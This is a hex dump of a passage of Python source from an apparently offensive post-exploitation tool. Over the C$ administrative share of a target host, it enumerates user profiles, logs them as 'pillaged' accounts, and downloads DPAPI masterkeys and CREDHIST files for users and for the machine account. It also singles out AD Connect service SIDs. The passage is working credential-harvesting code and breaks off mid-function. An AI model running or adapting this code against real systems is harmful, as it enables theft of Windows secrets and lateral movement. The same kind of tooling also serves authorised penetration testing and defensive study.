-00010ff0: 7242 794e 616d 6528 6c6f 6e67 6e61 6d65  rByName(longname
-00011000: 290a 0909 0909 0909 7365 6c66 2e64 622e  ).......self.db.
-00011010: 6164 645f 7573 6572 2875 7365 726e 616d  add_user(usernam
-00011020: 653d 7573 6572 2e75 7365 726e 616d 652c  e=user.username,
-00011030: 2070 696c 6c61 6765 645f 6672 6f6d 5f63   pillaged_from_c
-00011040: 6f6d 7075 7465 725f 6970 3d73 656c 662e  omputer_ip=self.
-00011050: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00011060: 7029 0a09 0909 0909 0975 7365 722e 7368  p).......user.sh
-00011070: 6172 6520 3d20 2743 2427 0a09 0965 6c73  are = 'C$'...els
-00011080: 653a 0a09 0909 666f 7220 7368 6172 6520  e:....for share 
-00011090: 696e 2073 6861 7265 733a 0a09 0909 0973  in shares:.....s
-000110a0: 656c 662e 6d79 6669 6c65 6f70 732e 646f  elf.myfileops.do
-000110b0: 5f75 7365 2873 6861 7265 290a 0909 0909  _use(share).....
-000110c0: 2320 7365 6c66 2e70 7764 203d 2027 5573  # self.pwd = 'Us
-000110d0: 6572 7327 0a09 0909 0963 6f6d 706c 6574  ers'.....complet
-000110e0: 696f 6e20 3d20 7365 6c66 2e6d 7966 696c  ion = self.myfil
-000110f0: 656f 7073 2e64 6f5f 6c73 2827 5573 6572  eops.do_ls('User
-00011100: 7327 2c20 272a 272c 2064 6973 706c 6179  s', '*', display
-00011110: 3d46 616c 7365 290a 0909 0909 666f 7220  =False).....for 
-00011120: 696e 666f 7320 696e 2063 6f6d 706c 6574  infos in complet
-00011130: 696f 6e3a 0a09 0909 0909 6c6f 6e67 6e61  ion:......longna
-00011140: 6d65 2c20 6973 5f64 6972 6563 746f 7279  me, is_directory
-00011150: 203d 2069 6e66 6f73 0a09 0909 0909 6966   = infos......if
-00011160: 2069 735f 6469 7265 6374 6f72 7920 616e   is_directory an
-00011170: 6420 6c6f 6e67 6e61 6d65 206e 6f74 2069  d longname not i
-00011180: 6e20 626c 6163 6b6c 6973 743a 0a09 0909  n blacklist:....
-00011190: 0909 0966 6f72 2075 7365 7220 696e 2073  ...for user in s
-000111a0: 656c 662e 7573 6572 733a 0a09 0909 0909  elf.users:......
-000111b0: 0909 6966 206c 6f6e 676e 616d 6520 3d3d  ..if longname ==
-000111c0: 2075 7365 725b 2775 7365 726e 616d 6527   user['username'
-000111d0: 5d3a 0a09 0909 0909 0909 0962 7265 616b  ]:.........break
-000111e0: 0a09 0909 0909 0965 6c73 653a 0a09 0909  .......else:....
-000111f0: 0909 0909 7365 6c66 2e75 7365 7273 2e61  ....self.users.a
-00011200: 7070 656e 6428 4d79 5573 6572 286c 6f6e  ppend(MyUser(lon
-00011210: 676e 616d 652c 2073 656c 662e 6c6f 6767  gname, self.logg
-00011220: 696e 672c 2073 656c 662e 6f70 7469 6f6e  ing, self.option
-00011230: 7329 290a 0909 0909 0909 0973 656c 662e  s))........self.
-00011240: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-00011250: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-00011260: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00011270: 707d 5d20 466f 756e 6420 7573 6572 207b  p}] Found user {
-00011280: 6263 6f6c 6f72 732e 4f4b 424c 5545 7d7b  bcolors.OKBLUE}{
-00011290: 6c6f 6e67 6e61 6d65 7d7b 6263 6f6c 6f72  longname}{bcolor
-000112a0: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
-000112b0: 0975 7365 7220 3d20 7365 6c66 2e47 6574  .user = self.Get
-000112c0: 5573 6572 4279 4e61 6d65 286c 6f6e 676e  UserByName(longn
-000112d0: 616d 6529 0a09 0909 0909 0909 7365 6c66  ame)........self
-000112e0: 2e64 622e 6164 645f 7573 6572 2875 7365  .db.add_user(use
-000112f0: 726e 616d 653d 7573 6572 2e75 7365 726e  rname=user.usern
-00011300: 616d 652c 2070 696c 6c61 6765 645f 6672  ame, pillaged_fr
-00011310: 6f6d 5f63 6f6d 7075 7465 725f 6970 3d73  om_computer_ip=s
-00011320: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
-00011330: 6574 5f69 7029 0a09 0909 0909 0909 7573  et_ip)........us
-00011340: 6572 2e73 6861 7265 203d 2073 6861 7265  er.share = share
-00011350: 0a09 0923 202b 4144 4420 4c4f 4341 4c20  ...# +ADD LOCAL 
-00011360: 4d41 4348 494e 4520 4143 434f 554e 540a  MACHINE ACCOUNT.
-00011370: 0909 7573 6572 203d 204d 7955 7365 7228  ..user = MyUser(
-00011380: 224d 4143 4849 4e45 2422 2c20 7365 6c66  "MACHINE$", self
-00011390: 2e6c 6f67 6769 6e67 2c20 7365 6c66 2e6f  .logging, self.o
-000113a0: 7074 696f 6e73 290a 0909 7573 6572 2e74  ptions)...user.t
-000113b0: 7970 6520 3d20 274d 4143 4849 4e45 270a  ype = 'MACHINE'.
-000113c0: 0909 7573 6572 2e73 6861 7265 203d 2027  ..user.share = '
-000113d0: 4324 270a 0909 7365 6c66 2e75 7365 7273  C$'...self.users
-000113e0: 2e61 7070 656e 6428 7573 6572 290a 0909  .append(user)...
-000113f0: 7365 6c66 2e64 622e 6164 645f 7573 6572  self.db.add_user
-00011400: 2875 7365 726e 616d 653d 7573 6572 2e75  (username=user.u
-00011410: 7365 726e 616d 652c 2070 696c 6c61 6765  sername, pillage
-00011420: 645f 6672 6f6d 5f63 6f6d 7075 7465 725f  d_from_computer_
-00011430: 6970 3d73 656c 662e 6f70 7469 6f6e 732e  ip=self.options.
-00011440: 7461 7267 6574 5f69 7029 0a09 0972 6574  target_ip)...ret
-00011450: 7572 6e20 7365 6c66 2e75 7365 7273 0a0a  urn self.users..
-00011460: 0964 6566 2067 6574 5f6d 6173 7465 726b  .def get_masterk
-00011470: 6579 7328 7365 6c66 293a 0a09 0973 656c  eys(self):...sel
-00011480: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00011490: 0a09 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
-000114a0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
-000114b0: 207b 6263 6f6c 6f72 732e 4f4b 424c 5545   {bcolors.OKBLUE
-000114c0: 7d5b 2b5d 2047 6174 6865 7269 6e67 206d  }[+] Gathering m
-000114d0: 6173 7465 726b 6579 7320 6f6e 2074 6865  asterkeys on the
-000114e0: 2074 6172 6765 747b 6263 6f6c 6f72 732e   target{bcolors.
-000114f0: 454e 4443 7d22 290a 0909 626c 6163 6b6c  ENDC}")...blackl
-00011500: 6973 7420 3d20 5b27 2e27 2c20 272e 2e27  ist = ['.', '..'
-00011510: 5d0a 0909 2320 7365 6c66 2e67 6574 5f73  ]...# self.get_s
-00011520: 6861 7265 7328 290a 0909 2320 7365 6c66  hares()...# self
-00011530: 2e67 6574 5f75 7365 7273 2829 0a09 0966  .get_users()...f
-00011540: 6f72 2075 7365 7220 696e 2073 656c 662e  or user in self.
-00011550: 7573 6572 733a 0a09 0909 6966 2075 7365  users:....if use
-00011560: 722e 7573 6572 6e61 6d65 2021 3d20 274d  r.username != 'M
-00011570: 4143 4849 4e45 2427 3a0a 0909 0909 7472  ACHINE$':.....tr
-00011580: 793a 0a09 0909 0909 746d 705f 7077 6420  y:......tmp_pwd 
-00011590: 3d20 6e74 7061 7468 2e6a 6f69 6e28 6e74  = ntpath.join(nt
-000115a0: 7061 7468 2e6a 6f69 6e28 2755 7365 7273  path.join('Users
-000115b0: 272c 2075 7365 722e 7573 6572 6e61 6d65  ', user.username
-000115c0: 292c 2027 4170 7044 6174 615c 5c52 6f61  ), 'AppData\\Roa
-000115d0: 6d69 6e67 5c5c 4d69 6372 6f73 6f66 745c  ming\\Microsoft\
-000115e0: 5c50 726f 7465 6374 2729 0a09 0909 0909  \Protect')......
-000115f0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-00011600: 7567 280a 0909 0909 0909 6622 5b7b 7365  ug(.......f"[{se
-00011610: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-00011620: 745f 6970 7d5d 204c 6f6f 6b69 6e67 2066  t_ip}] Looking f
-00011630: 6f72 207b 6263 6f6c 6f72 732e 4f4b 424c  or {bcolors.OKBL
-00011640: 5545 7d7b 7573 6572 2e75 7365 726e 616d  UE}{user.usernam
-00011650: 657d 7b62 636f 6c6f 7273 2e45 4e44 437d  e}{bcolors.ENDC}
-00011660: 204d 6173 7465 726b 6579 2069 6e20 2573   Masterkey in %s
-00011670: 2220 2520 746d 705f 7077 6429 0a09 0909  " % tmp_pwd)....
-00011680: 0909 6d79 5f64 6972 6563 746f 7279 203d  ..my_directory =
-00011690: 2073 656c 662e 6d79 6669 6c65 6f70 732e   self.myfileops.
-000116a0: 646f 5f6c 7328 746d 705f 7077 642c 2027  do_ls(tmp_pwd, '
-000116b0: 272c 2064 6973 706c 6179 3d54 7275 6529  ', display=True)
-000116c0: 0a09 0909 0909 666f 7220 696e 666f 7320  ......for infos 
-000116d0: 696e 206d 795f 6469 7265 6374 6f72 793a  in my_directory:
-000116e0: 0a09 0909 0909 0974 7279 3a0a 0909 0909  .......try:.....
-000116f0: 0909 096c 6f6e 676e 616d 652c 2069 735f  ...longname, is_
-00011700: 6469 7265 6374 6f72 7920 3d20 696e 666f  directory = info
-00011710: 730a 0909 0909 0909 0969 6620 6c6f 6e67  s........if long
-00011720: 6e61 6d65 206e 6f74 2069 6e20 626c 6163  name not in blac
-00011730: 6b6c 6973 743a 0a09 0909 0909 0909 0973  klist:.........s
-00011740: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-00011750: 6728 6622 5b7b 7365 6c66 2e6f 7074 696f  g(f"[{self.optio
-00011760: 6e73 2e74 6172 6765 745f 6970 7d5d 2041  ns.target_ip}] A
-00011770: 6e61 6c79 7369 6e67 207b 6c6f 6e67 6e61  nalysing {longna
-00011780: 6d65 7d20 666f 7220 4d61 7374 6572 6b65  me} for Masterke
-00011790: 7973 2229 0a09 0909 0909 0909 0969 6620  ys").........if 
-000117a0: 6973 5f64 6972 6563 746f 7279 2061 6e64  is_directory and
-000117b0: 206c 6f6e 676e 616d 655b 3a32 5d20 3d3d   longname[:2] ==
-000117c0: 2027 532d 273a 2020 2320 5349 440a 0909   'S-':  # SID...
-000117d0: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
-000117e0: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
-000117f0: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-00011800: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-00011810: 5d20 7b62 636f 6c6f 7273 2e4f 4b42 4c55  ] {bcolors.OKBLU
-00011820: 457d 7b75 7365 722e 7573 6572 6e61 6d65  E}{user.username
-00011830: 7d7b 6263 6f6c 6f72 732e 454e 4443 7d20  }{bcolors.ENDC} 
-00011840: 2d20 466f 756e 6420 5349 4420 7b6c 6f6e  - Found SID {lon
-00011850: 676e 616d 657d 2229 0a09 0909 0909 0909  gname}")........
-00011860: 0909 7573 6572 2e73 6964 203d 206c 6f6e  ..user.sid = lon
-00011870: 676e 616d 650a 0909 0909 0909 0909 0969  gname..........i
-00011880: 6620 7573 6572 2e73 6964 2e73 7461 7274  f user.sid.start
-00011890: 7377 6974 6828 2753 2d31 2d35 2d38 3027  swith('S-1-5-80'
-000118a0: 293a 0a09 0909 0909 0909 0909 0973 656c  ):...........sel
-000118b0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-000118c0: 0a09 0909 0909 0909 0909 0909 6622 5b7b  ............f"[{
-000118d0: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
-000118e0: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
-000118f0: 732e 4641 494c 7d7b 7573 6572 2e75 7365  s.FAIL}{user.use
-00011900: 726e 616d 657d 7b62 636f 6c6f 7273 2e45  rname}{bcolors.E
-00011910: 4e44 437d 202d 2046 6f75 6e64 2041 4420  NDC} - Found AD 
-00011920: 434f 4e4e 4543 5420 5349 4420 7b6c 6f6e  CONNECT SID {lon
-00011930: 676e 616d 657d 2229 0a09 0909 0909 0909  gname}")........
-00011940: 0909 0975 7365 722e 6973 5f61 6463 6f6e  ...user.is_adcon
-00011950: 6e65 6374 203d 2054 7275 650a 0909 0909  nect = True.....
-00011960: 0909 0909 0923 2075 7365 722e 6368 6563  .....# user.chec
-00011970: 6b5f 7573 6572 7479 7065 2829 0a09 0909  k_usertype()....
-00011980: 0909 0909 0909 746d 705f 7077 6432 203d  ......tmp_pwd2 =
-00011990: 206e 7470 6174 682e 6a6f 696e 2874 6d70   ntpath.join(tmp
-000119a0: 5f70 7764 2c20 6c6f 6e67 6e61 6d65 290a  _pwd, longname).
-000119b0: 0909 0909 0909 0909 096d 795f 6469 7265  .........my_dire
-000119c0: 6374 6f72 7932 203d 2073 656c 662e 6d79  ctory2 = self.my
-000119d0: 6669 6c65 6f70 732e 646f 5f6c 7328 746d  fileops.do_ls(tm
-000119e0: 705f 7077 6432 2c20 2727 2c20 6469 7370  p_pwd2, '', disp
-000119f0: 6c61 793d 4661 6c73 6529 0a09 0909 0909  lay=False)......
-00011a00: 0909 0909 666f 7220 696e 666f 7332 2069  ....for infos2 i
-00011a10: 6e20 6d79 5f64 6972 6563 746f 7279 323a  n my_directory2:
-00011a20: 0a09 0909 0909 0909 0909 096c 6f6e 676e  ...........longn
-00011a30: 616d 6532 2c20 6973 5f64 6972 6563 746f  ame2, is_directo
-00011a40: 7279 3220 3d20 696e 666f 7332 0a09 0909  ry2 = infos2....
-00011a50: 0909 0909 0909 0969 6620 6e6f 7420 6973  .......if not is
-00011a60: 5f64 6972 6563 746f 7279 3220 616e 6420  _directory2 and 
-00011a70: 6973 5f67 7569 6428 6c6f 6e67 6e61 6d65  is_guid(longname
-00011a80: 3229 3a20 2023 2047 5549 440a 0909 0909  2):  # GUID.....
-00011a90: 0909 0909 0909 0973 656c 662e 646f 776e  .......self.down
-00011aa0: 6c6f 6164 5f6d 6173 7465 726b 6579 2875  load_masterkey(u
-00011ab0: 7365 722c 2074 6d70 5f70 7764 322c 206c  ser, tmp_pwd2, l
-00011ac0: 6f6e 676e 616d 6532 2c20 7479 7065 3d27  ongname2, type='
-00011ad0: 5553 4552 2729 0a09 0909 0909 0909 0965  USER').........e
-00011ae0: 6c69 6620 6973 5f64 6972 6563 746f 7279  lif is_directory
-00011af0: 3a0a 0909 0909 0909 0909 0973 656c 662e  :..........self.
-00011b00: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
-00011b10: 0909 0909 0909 0909 0966 225b 7b73 656c  .........f"[{sel
-00011b20: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-00011b30: 5f69 707d 5d20 466f 756e 6420 4469 7265  _ip}] Found Dire
-00011b40: 6374 6f72 7920 2573 202d 3e20 646f 696e  ctory %s -> doin
-00011b50: 6720 6e6f 7468 696e 6722 2025 206c 6f6e  g nothing" % lon
-00011b60: 676e 616d 6529 0a09 0909 0909 0909 0965  gname).........e
-00011b70: 6c73 653a 0a09 0909 0909 0909 0909 7365  lse:..........se
-00011b80: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
-00011b90: 2866 225b 7b73 656c 662e 6f70 7469 6f6e  (f"[{self.option
-00011ba0: 732e 7461 7267 6574 5f69 707d 5d20 466f  s.target_ip}] Fo
-00011bb0: 756e 6420 6669 6c65 2025 7322 2025 206c  und file %s" % l
-00011bc0: 6f6e 676e 616d 6529 0a09 0909 0909 0909  ongname)........
-00011bd0: 0909 6966 2022 4352 4544 4849 5354 2220  ..if "CREDHIST" 
-00011be0: 696e 206c 6f6e 676e 616d 653a 0a09 0909  in longname:....
-00011bf0: 0909 0909 0909 0973 656c 662e 646f 776e  .......self.down
-00011c00: 6c6f 6164 5f63 7265 6468 6973 7428 7573  load_credhist(us
-00011c10: 6572 2c20 746d 705f 7077 642c 206c 6f6e  er, tmp_pwd, lon
-00011c20: 676e 616d 652c 2074 7970 653d 2755 5345  gname, type='USE
-00011c30: 5227 290a 0909 0909 0909 6578 6365 7074  R').......except
-00011c40: 2045 7863 6570 7469 6f6e 2061 7320 6578   Exception as ex
-00011c50: 3a0a 0909 0909 0909 0973 656c 662e 6c6f  :........self.lo
-00011c60: 6767 696e 672e 6465 6275 6728 0a09 0909  gging.debug(....
-00011c70: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-00011c80: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-00011c90: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
-00011ca0: 4e47 7d45 7863 6570 7469 6f6e 2069 6e20  NG}Exception in 
-00011cb0: 6765 745f 6d61 7374 6572 6b65 7973 2066  get_masterkeys f
-00011cc0: 6f72 207b 6c6f 6e67 6e61 6d65 7d7b 6263  or {longname}{bc
-00011cd0: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
-00011ce0: 0909 0909 0973 656c 662e 6c6f 6767 696e  .....self.loggin
-00011cf0: 672e 6465 6275 6728 6578 290a 0909 0909  g.debug(ex).....
-00011d00: 0909 0963 6f6e 7469 6e75 650a 0909 0909  ...continue.....
-00011d10: 6578 6365 7074 2045 7863 6570 7469 6f6e  except Exception
-00011d20: 2061 7320 6578 3a0a 0909 0909 0973 656c   as ex:......sel
-00011d30: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00011d40: 0a09 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-00011d50: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-00011d60: 707d 5d20 7b62 636f 6c6f 7273 2e57 4152  p}] {bcolors.WAR
-00011d70: 4e49 4e47 7d45 7863 6570 7469 6f6e 2067  NING}Exception g
-00011d80: 6574 5f6d 6173 7465 726b 6579 737b 6263  et_masterkeys{bc
-00011d90: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
-00011da0: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-00011db0: 6465 6275 6728 6578 290a 0909 0909 0963  debug(ex)......c
-00011dc0: 6f6e 7469 6e75 650a 0909 2323 4d41 4348  ontinue...##MACH
-00011dd0: 494e 4520 4d41 5354 4552 4b45 5953 0a09  INE MASTERKEYS..
-00011de0: 0974 7279 3a0a 0909 0975 7365 7220 3d20  .try:....user = 
-00011df0: 7365 6c66 2e47 6574 5573 6572 4279 4e61  self.GetUserByNa
-00011e00: 6d65 2827 4d41 4348 494e 4524 2729 0a09  me('MACHINE$')..
-00011e10: 0909 2320 4d61 6b65 2061 2022 4d41 4348  ..# Make a "MACH
-00011e20: 494e 4524 2220 7573 6572 0a09 0909 2222  INE$" user....""
-00011e30: 2275 7365 723d 4d79 5573 6572 2822 4d41  "user=MyUser("MA
-00011e40: 4348 494e 4524 222c 7365 6c66 2e6c 6f67  CHINE$",self.log
-00011e50: 6769 6e67 2c73 656c 662e 6f70 7469 6f6e  ging,self.option
-00011e60: 7329 0a09 0909 7573 6572 2e74 7970 653d  s)....user.type=
-00011e70: 274d 4143 4849 4e45 270a 0909 0973 656c  'MACHINE'....sel
-00011e80: 662e 7573 6572 732e 6170 7065 6e64 2875  f.users.append(u
-00011e90: 7365 7229 2222 220a 0a09 0909 746d 705f  ser)""".....tmp_
-00011ea0: 7077 6420 3d20 2757 696e 646f 7773 5c5c  pwd = 'Windows\\
-00011eb0: 5379 7374 656d 3332 5c5c 4d69 6372 6f73  System32\\Micros
-00011ec0: 6f66 745c 5c50 726f 7465 6374 2720 2023  oft\\Protect'  #
-00011ed0: 2041 6464 2057 696e 646f 7773 5c53 6572   Add Windows\Ser
-00011ee0: 7669 6365 5072 6f66 696c 6573 5c41 4453  viceProfiles\ADS
-00011ef0: 796e 635c 4170 7044 6174 615c 526f 616d  ync\AppData\Roam
-00011f00: 696e 675c 4d69 6372 6f73 6f66 745c 5072  ing\Microsoft\Pr
-00011f10: 6f74 6563 745c 2066 6f72 2041 4443 6f6e  otect\ for ADCon
-00011f20: 6e65 6374 203f 0a09 0909 7365 6c66 2e6c  nect ?....self.l
-00011f30: 6f67 6769 6e67 2e64 6562 7567 2866 225b  ogging.debug(f"[
-00011f40: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
-00011f50: 7267 6574 5f69 707d 5d20 4c6f 6f6b 696e  rget_ip}] Lookin
-00011f60: 6720 666f 7220 4d61 6368 696e 6520 4d61  g for Machine Ma
-00011f70: 7374 6572 6b65 7920 696e 2025 7322 2025  sterkey in %s" %
-00011f80: 2074 6d70 5f70 7764 290a 0909 096d 795f   tmp_pwd)....my_
-00011f90: 6469 7265 6374 6f72 7920 3d20 7365 6c66  directory = self
-00011fa0: 2e6d 7966 696c 656f 7073 2e64 6f5f 6c73  .myfileops.do_ls
-00011fb0: 2874 6d70 5f70 7764 2c20 2727 2c20 6469  (tmp_pwd, '', di
-00011fc0: 7370 6c61 793d 4661 6c73 6529 0a09 0909  splay=False)....
-00011fd0: 666f 7220 696e 666f 7320 696e 206d 795f  for infos in my_
-00011fe0: 6469 7265 6374 6f72 793a 0a09 0909 096c  directory:.....l
-00011ff0: 6f6e 676e 616d 652c 2069 735f 6469 7265  ongname, is_dire
-00012000: 6374 6f72 7920 3d20 696e 666f 730a 0909  ctory = infos...
-00012010: 0909 6966 206c 6f6e 676e 616d 6520 6e6f  ..if longname no
-00012020: 7420 696e 2062 6c61 636b 6c69 7374 3a0a  t in blacklist:.
-00012030: 0909 0909 0969 6620 6973 5f64 6972 6563  .....if is_direc
-00012040: 746f 7279 2061 6e64 206c 6f6e 676e 616d  tory and longnam
-00012050: 655b 3a32 5d20 3d3d 2027 532d 273a 2020  e[:2] == 'S-':  
-00012060: 2320 5349 440a 0909 0909 0909 7365 6c66  # SID.......self
-00012070: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
-00012080: 0909 0909 0909 0966 225b 7b73 656c 662e  .......f"[{self.
-00012090: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
-000120a0: 707d 5d20 7b62 636f 6c6f 7273 2e4f 4b42  p}] {bcolors.OKB
-000120b0: 4c55 457d 7b75 7365 722e 7573 6572 6e61  LUE}{user.userna
-000120c0: 6d65 7d7b 6263 6f6c 6f72 732e 454e 4443  me}{bcolors.ENDC
-000120d0: 7d20 2d20 466f 756e 6420 5349 4420 7b6c  } - Found SID {l
-000120e0: 6f6e 676e 616d 657d 2229 0a09 0909 0909  ongname}")......
-000120f0: 0975 7365 722e 7369 6420 3d20 6c6f 6e67  .user.sid = long
-00012100: 6e61 6d65 0a09 0909 0909 0969 6620 7573  name.......if us
-00012110: 6572 2e73 6964 2e73 7461 7274 7377 6974  er.sid.startswit
-00012120: 6828 2753 2d31 2d35 2d38 3027 293a 0a09  h('S-1-5-80'):..
-00012130: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
-00012140: 6e67 2e64 6562 7567 280a 0909 0909 0909  ng.debug(.......
-00012150: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
-00012160: 6e73 2e74 6172 6765 745f 6970 7d5d 207b  ns.target_ip}] {
-00012170: 6263 6f6c 6f72 732e 4641 494c 7d7b 7573  bcolors.FAIL}{us
-00012180: 6572 2e75 7365 726e 616d 657d 7b62 636f  er.username}{bco
-00012190: 6c6f 7273 2e45 4e44 437d 202d 2046 6f75  lors.ENDC} - Fou
-000121a0: 6e64 2041 4420 434f 4e4e 4543 5420 5349  nd AD CONNECT SI
-000121b0: 4420 7b6c 6f6e 676e 616d 657d 2229 0a09  D {longname}")..
-000121c0: 0909 0909 0909 7573 6572 2e69 735f 6164  ......user.is_ad
-000121d0: 636f 6e6e 6563 7420 3d20 5472 7565 0a09  connect = True..
-000121e0: 0909 0909 0974 6d70 5f70 7764 3220 3d20  .....tmp_pwd2 = 
-000121f0: 6e74 7061 7468 2e6a 6f69 6e28 746d 705f  ntpath.join(tmp_
-00012200: 7077 642c 206c 6f6e 676e 616d 6529 0a09  pwd, longname)..
-00012210: 0909 0909 096d 795f 6469 7265 6374 6f72  .....my_director
-00012220: 7932 203d 2073 656c 662e 6d79 6669 6c65  y2 = self.myfile
-00012230: 6f70 732e 646f 5f6c 7328 746d 705f 7077  ops.do_ls(tmp_pw
-00012240: 6432 2c20 2727 2c20 6469 7370 6c61 793d  d2, '', display=
-00012250: 4661 6c73 6529 0a09 0909 0909 0966 6f72  False).......for
-00012260: 2069 6e66 6f73 3220 696e 206d 795f 6469   infos2 in my_di
-00012270: 7265 6374 6f72 7932 3a0a 0909 0909 0909  rectory2:.......
-00012280: 096c 6f6e 676e 616d 6532 2c20 6973 5f64  .longname2, is_d
-00012290: 6972 6563 746f 7279 3220 3d20 696e 666f  irectory2 = info
-000122a0: 7332 0a09 0909 0909 0909 6966 206c 6f6e  s2........if lon
-000122b0: 676e 616d 6532 206e 6f74 2069 6e20 626c  gname2 not in bl
-000122c0: 6163 6b6c 6973 743a 0a09 0909 0909 0909  acklist:........
-000122d0: 0969 6620 6e6f 7420 6973 5f64 6972 6563  .if not is_direc
-000122e0: 746f 7279 3220 616e 6420 6973 5f67 7569  tory2 and is_gui
-000122f0: 6428 6c6f 6e67 6e61 6d65 3229 3a20 2023  d(longname2):  #
-00012300: 2047 5549 440a 0909 0909 0909 0909 0923   GUID..........#
-00012310: 2044 6f77 6e6c 6f61 6469 6e67 2066 696c   Downloading fil
-00012320: 650a 0909 0909 0909 0909 0973 656c 662e  e..........self.
-00012330: 646f 776e 6c6f 6164 5f6d 6173 7465 726b  download_masterk
-00012340: 6579 2875 7365 722c 2074 6d70 5f70 7764  ey(user, tmp_pwd
-00012350: 322c 206c 6f6e 676e 616d 6532 2c20 7479  2, longname2, ty
-00012360: 7065 3d27 4d41 4348 494e 4527 290a 0909  pe='MACHINE')...
-00012370: 0909 0909 0909 656c 6966 2069 735f 6469  ......elif is_di
-00012380: 7265 6374 6f72 7932 2061 6e64 206c 6f6e  rectory2 and lon
-00012390: 676e 616d 6532 203d 3d20 2755 7365 7227  gname2 == 'User'
-000123a0: 3a20 2023 204f 6e20 7365 206c 696d 6974  :  # On se limit
-000123b0: 6520 6120 6361 2070 6f75 7220 6c65 206d  e a ca pour le m
-000123c0: 6f6d 656e 740a 0909 0909 0909 0909 0974  oment..........t
-000123d0: 6d70 5f70 7764 3320 3d20 6e74 7061 7468  mp_pwd3 = ntpath
-000123e0: 2e6a 6f69 6e28 746d 705f 7077 6432 2c20  .join(tmp_pwd2, 
-000123f0: 6c6f 6e67 6e61 6d65 3229 0a09 0909 0909  longname2)......
-00012400: 0909 0909 6d79 5f64 6972 6563 746f 7279  ....my_directory
-00012410: 3320 3d20 7365 6c66 2e6d 7966 696c 656f  3 = self.myfileo
-00012420: 7073 2e64 6f5f 6c73 2874 6d70 5f70 7764  ps.do_ls(tmp_pwd
-00012430: 332c 2027 272c 2064 6973 706c 6179 3d46  3, '', display=F
-00012440: 616c 7365 290a 0909 0909 0909 0909 0966  alse)..........f
-00012450: 6f72 2069 6e66 6f73 3320 696e 206d 795f  or infos3 in my_
-00012460: 6469 7265 6374 6f72 7933 3a0a 0909 0909  directory3:.....
-00012470: 0909 0909 0909 6c6f 6e67 6e61 6d65 332c  ......longname3,
-00012480: 2069 735f 6469 7265 6374 6f72 7933 203d   is_directory3 =
-00012490: 2069 6e66 6f73 330a 0909 0909 0909 0909   infos3.........
-000124a0: 0909 6966 206c 6f6e 676e 616d 6533 206e  ..if longname3 n
-000124b0: 6f74 2069 6e20 626c 6163 6b6c 6973 743a  ot in blacklist:
-000124c0: 0a09 0909 0909 0909 0909 0909 6966 206e  ............if n
-000124d0: 6f74 2069 735f 6469 7265 6374 6f72 7933  ot is_directory3
-000124e0: 2061 6e64 2069 735f 6775 6964 286c 6f6e   and is_guid(lon
-000124f0: 676e 616d 6533 293a 2020 2320 4755 4944  gname3):  # GUID
-00012500: 0a09 0909 0909 0909 0909 0909 0973 656c  .............sel
-00012510: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-00012520: 0a09 0909 0909 0909 0909 0909 0909 6622  ..............f"
-00012530: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-00012540: 6172 6765 745f 6970 7d5d 207b 7573 6572  arget_ip}] {user
-00012550: 2e75 7365 726e 616d 657d 202d 2046 6f75  .username} - Fou
-00012560: 6e64 2047 5549 4420 7b6c 6f6e 676e 616d  nd GUID {longnam
-00012570: 6533 7d22 290a 0909 0909 0909 0909 0909  e3}")...........
-00012580: 0909 2320 446f 776e 6c6f 6164 696e 6720  ..# Downloading 
-00012590: 6669 6c65 0a09 0909 0909 0909 0909 0909  file............
-000125a0: 0973 656c 662e 646f 776e 6c6f 6164 5f6d  .self.download_m
-000125b0: 6173 7465 726b 6579 2875 7365 722c 2074  asterkey(user, t
-000125c0: 6d70 5f70 7764 332c 206c 6f6e 676e 616d  mp_pwd3, longnam
-000125d0: 6533 2c20 7479 7065 3d27 4d41 4348 494e  e3, type='MACHIN
-000125e0: 452d 5553 4552 2729 0a09 0909 0909 0909  E-USER')........
-000125f0: 0909 0909 656c 7365 3a0a 0909 0909 0909  ....else:.......
-00012600: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
